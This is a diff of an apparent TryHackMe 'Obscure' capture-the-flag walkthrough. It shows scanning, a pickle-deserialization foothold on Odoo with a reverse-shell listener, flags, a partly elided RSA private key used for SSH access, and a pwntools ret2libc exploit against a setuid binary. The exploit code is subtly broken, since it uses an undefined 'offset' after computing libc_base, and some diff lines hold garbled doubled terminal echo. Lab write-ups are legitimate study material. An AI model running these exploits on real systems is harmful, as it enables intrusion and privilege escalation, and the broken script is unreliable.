@@ -1,29 +1,11 @@
-```bash
-```
 
-```bash
-```
+<img width="1882" height="372" alt="image" src="https://github.com/user-attachments/assets/4acb4ddb-c100-440a-aa18-22443196fcf9" />
 
-```bash
-```
 
+<br>
 
 <h3>Nikto</h3>
 
-```bash
-:~/Obscure# nikto -h xx.xxx.xx.xx
-- Nikto v2.1.5
----------------------------------------------------------------------------
-+ Target IP:          xx.xxx.xx.xx
-+ Target Hostname:    ip-xx-xxx-xx-xx.ec2.internal
-+ Target Port:        80
-+ Start Time:         2025-08-16 xx:xx:xx (GMT1)
----------------------------------------------------------------------------
-+ Server: Werkzeug/0.9.6 Python/2.7.9
-+ Cookie session_id created without the httponly flag
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-```
 
 <h3>Nmap</h3>
 
@@ -264,13 +246,13 @@ crtstuff.c
 
 <br>
 <br>
-
-<img width="1256" height="561" alt="image" src="https://github.com/user-attachments/assets/0a8b883f-f5b4-48a8-b052-ebcf91b0c5eb" />
-
 <br>
 <br>
 
-<img width="1256" height="213" alt="image" src="https://github.com/user-attachments/assets/d7740ffc-0a25-47f9-b15f-cd2922825820" />
+<img width="1223" height="334" alt="image" src="https://github.com/user-attachments/assets/7f9f502b-2b5e-4853-bfae-8196fd9aed18" />
+
+<br>
+<br>
 
 <br>
 <h3>Exploit</h3>
@@ -323,57 +305,87 @@ with open("exploit.pickle", "wb") as f:
 44064.md  exploit.pickle  exploit.py
 ```
 
-
-
-<img width="1255" height="623" alt="image" src="https://github.com/user-attachments/assets/1bbe92c7-f719-4ba5-aade-bfc0e35a0b01" />
-
-
-
-<img width="1246" height="204" alt="image" src="https://github.com/user-attachments/assets/95632dfd-e8e4-40de-9c37-400288fd0f53" />
-
+<br>
+<br>
 
 
 <p>
 
-- clicked Install</p>
-
-<img width="1270" height="351" alt="image" src="https://github.com/user-attachments/assets/6ab43d43-57c1-4e0a-a938-782bdf1b6352" />
+- click <code>Settings</code><br<
+- search for <code>Database Anonymization</code><br>
+- click <code>Install</code><br>
+- refresh<br>
+- click <code>Settings</code><br>
+- click <code>Anonymize database</code><br>
+- click <code>Anonymize Database</code><br>
+- refresh<br>
+- click <code>Upload your file</code><br>
+- set up a listener in the same port considered in the payload<br>
+- click <code>Reverse the Database Anonymization</code><br>
+- </p>
 
 <br>
-
-<img width="1247" height="348" alt="image" src="https://github.com/user-attachments/assets/66d53488-b9be-47ee-9806-ae3e6354af6c" />
-
 <br>
 
-<img width="1246" height="389" alt="image" src="https://github.com/user-attachments/assets/7ecb63c7-0d15-4290-80b3-39227ab47ca3" />
+<img width="1232" height="332" alt="image" src="https://github.com/user-attachments/assets/cf5734a4-0c99-4220-8cf4-c5cfd52da6c4" />
+
+<br>
+<br>
+
+<img width="1229" height="425" alt="image" src="https://github.com/user-attachments/assets/54e2784e-1bdd-4dcb-8594-7b40b93e129a" />
+
+<br>
+<br>
+
+<img width="1239" height="420" alt="image" src="https://github.com/user-attachments/assets/c59928fc-b390-4c56-b8ba-940e41e699ea" />
+
+
+<br>
+<br>
+
+<img width="1233" height="310" alt="image" src="https://github.com/user-attachments/assets/e95a2099-3296-4acd-8466-c015f89f6e2f" />
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+<img width="1255" height="623" alt="image" src="https://github.com/user-attachments/assets/1bbe92c7-f719-4ba5-aade-bfc0e35a0b01" />
+
+<br>
+<br>
+
+<img width="1246" height="204" alt="image" src="https://github.com/user-attachments/assets/95632dfd-e8e4-40de-9c37-400288fd0f53" />
 
 <br>
 <br>
 
 <img width="1252" height="399" alt="image" src="https://github.com/user-attachments/assets/036604b2-95c2-400e-90df-a69ed3842018" />
 
-```bash
 
-
+<br>
+<br>
 
 ```bash
 SHELL=/bin/bash script -q /dev/null
 ```
-/
-odoo@b8a9bbf1f380:/$ ccdd  //vvaarr//lliibb//ooddoooo
 
-odoo@b8a9bbf1f380:~$ llss
+<br>
 
+```bash
+odoo@b8a9bbf1f380:/$ cd /var/lib/odoo
+odoo@b8a9bbf1f380:~$ ls
 addons
 field_anonymization_main_1.pickle
 filestore
 flag.txt
 sessions
-odoo@b8a9bbf1f380:~$ ccaatt  ffllaagg..ttxxtt
-
+odoo@b8a9bbf1f380:~$ cat flag.txt
 THM{1243b64a3a01a8732ccb96217f593520}
-odoo@b8a9bbf1f380:~$ ffiinndd  //  --ppeerrmm  --uu==ss  --ttyyppee  ff  22>>//ddeevv//nnuullll
-
+odoo@b8a9bbf1f380:~$ find / -perm -u=s f 2>/dev/null
 /bin/mount
 /bin/umount
 /bin/ping
@@ -386,13 +398,12 @@ odoo@b8a9bbf1f380:~$ ffiinndd  //  --ppeerrmm  --uu==ss  --ttyyppee  ff  22>>//d
 /usr/bin/gpasswd
 /usr/bin/passwd
 /ret
-odoo@b8a9bbf1f380:~$ 
-
 ```
 
-```bash
-odoo@b8a9bbf1f380:/$ llss  --llaahh
+<br>
 
+```bash
+odoo@b8a9bbf1f380:/$ ls -lah
 total 88K
 drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
 drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
@@ -418,16 +429,280 @@ dr-xr-xr-x  13 root root    0 Aug 16 20:18 sys
 drwxrwxrwt   1 root root 4.0K Aug 16 22:03 tmp
 drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
 drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
-
 ```
 
-```bash
-SHELL=/bin/bash script -q /dev/null
-```
+<br>
+<br>
+<br>
+<br>
 
-```bash
-```
 
 ```bash
+:~/Obscure# cat .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
+...
+zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
+Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
+aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
+/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
+oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
+PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
+EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
+c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
+-----END RSA PRIVATE KEY-----
 ```
+
+<br>
+
+```bash
+:~/Obscure#  chmod 600 id_rsa
+```
+
+<br>
+
+```bash
+:~/Obscure# ssh -i id_rsa zeeshan@xx.xxx.xxx.xxx
+```
+
+<br>
+<br>
+
+<img width="1212" height="605" alt="image" src="https://github.com/user-attachments/assets/5fd6b9af-dc24-43f3-83ee-8d807440c7ec" />
+
+<br>
+<br>
+
+```bash
+zeeshan@hydra:~$ pwd
+/home/zeeshan
+```
+
+<br>
+
+```bash
+zeeshan@hydra:~$ cat user.txt
+THM{43b0b68ba2755dd6cac3b8bf5454db94}
+```
+
+<br>
+<br>
+
+```bash
+zeeshan@hydra:~$ netstat -tunlp
+...
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 172.17.0.1:4444         0.0.0.0:*               LISTEN      1797/socat      
+tcp        0      0 127.0.0.1:36768         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::21                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -          
+```
+
+<br>
+
+<br>
+
+<h3>zeeshan´s privileges</h3>
+
+```bash
+zeeshan@hydra:~$ sudo -l
+Matching Defaults entries for zeeshan on hydra:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User zeeshan may run the following commands on hydra:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /exploit_me
+```
+
+<br>
+
+<br>
+<br>
+<h3>ret</h3><br>
+
+<br>
+<br>
+
+
+```bash
+:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/ret -o ret
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8864  100  8864    0     0  4328k      0 --:--:-- --:--:-- --:--:-- 4328k
+```
+
+<br>
+
+
+```bash
+zeeshan@hydra:~$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 ...
+xx.xxx.xx.xxx - - [17/Aug/2025 xx:xx:xx] "GET /ret HTTP/1.1" 200 -
+```
+
+<br>
+
+```bash
+:~/Obscure# chmod 777 ret
+```
+
+<br>
+
+```bash
+:~/Obscure# file ret
+ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c3a9e9f974de13925f0644178007bdbf22576e3, not stripped
+```
+
+<br>
+<h3>Ghidra</h3>
+
+<br>
+<br>
+
+<img width="636" height="473" alt="image" src="https://github.com/user-attachments/assets/95d7cc23-1e68-4379-a5a1-58a8f0e9a550" />
+
+
+<br>
+<br>
+<br>
+<h3>exploit_me</h3>
+
+```bash
+zeeshan@hydra:/$ ls
+bin   dev  exploit_me  initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
+boot  etc  home        initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
+```
+
+<br>
+
+```bash
+:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/exploit_me -o exploit_me
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8712  100  8712    0     0  2835k      0 --:--:-- --:--:-- --:--:-- 2835k
+```
+
+<br>
+
+
+```bash
+:~/Obscure# chmod 777 exploit_me
+```
+
+<br>
+<br>
+<h4>Ghidra</h4>
+
+<br>
+
+<img width="1293" height="738" alt="image" src="https://github.com/user-attachments/assets/d1aa2118-7527-4fc4-9135-67bffebdff1d" />
+
+<br>
+<br>
+
+
+```bash
+undefined8 main(void)
+
+{
+  char local_28 [32];
+  
+  setuid(0);
+  puts("Exploit this binary for root!");
+  gets(local_28);
+  return 0;
+}
+```
+
+
+
+
+<br>
+
+```bash
+:~/Obscure# ldd exploit_me
+	linux-vdso.so.1 (0x00007ffc7a3bc000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd1a5b90000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fd1a5da1000)
+```
+
+<br>
+
+
+```bash
+:~/Obscure# cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
+```
+
+<br>
+
+```bash
+:~/Obscure# # ldd exploit_me
+	linux-vdso.so.1 (0x00007ffcb2ab1000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6b64dea000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f6b64ffb000)
+```
+
+
+
+
+<p><em>https://0xrodon.medium.com/tryhackme-obscure-walkthrough-obscure-ctf-e2eb82ff5245</em></p>
+
+```bash
+:~/Obscure# cat exploit.py
+#!/usr/bin/python
+from pwn import *
+
+elf = context.binary = ELF('./exploit_me', checksec=False)
+libc = elf.libc
+
+# Connect via SSH using the private key for authentication
+s = ssh(host='10.201.124.236', user='zeeshan', keyfile='id_rsa')
+
+# Run the binary on the remote host
+p = s.run('./exploit_me')
+
+# Prepare the payload
+prefix = b"a" * 40
+pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
+go_gets = p64(elf.got.gets)
+go_puts = p64(elf.got.puts)
+fn_puts = p64(elf.plt.puts)
+fn_main = p64(elf.symbols.main)
+
+payload = (prefix + pop_rdi + go_gets + fn_puts +
+pop_rdi + go_puts + fn_puts +
+fn_main)
+
+# Send the payload and receive the response
+p.clean()
+p.sendline(payload)
+
+# Read addresses from the response
+gets_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
+puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
+print('Gets :'  + hex(gets_addr)[-5:])
+print('Puts :'  + hex(puts_addr)[-5:])
+
+# Calculate the addresses for system and /bin/sh
+libc_base = gets_addr - 0x6ed90 # address found on libc.rip after first execution
+bin_sh = p64(offset + 0x18ce57) # address of /bin/sh
+system = p64(offset + 0x453a0) # address of system
+
+# Prepare the final payload
+payload = prefix + pop_rdi + bin_sh + system
+
+# Send the final payload
+p.clean()
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+<br>
+<br>
 
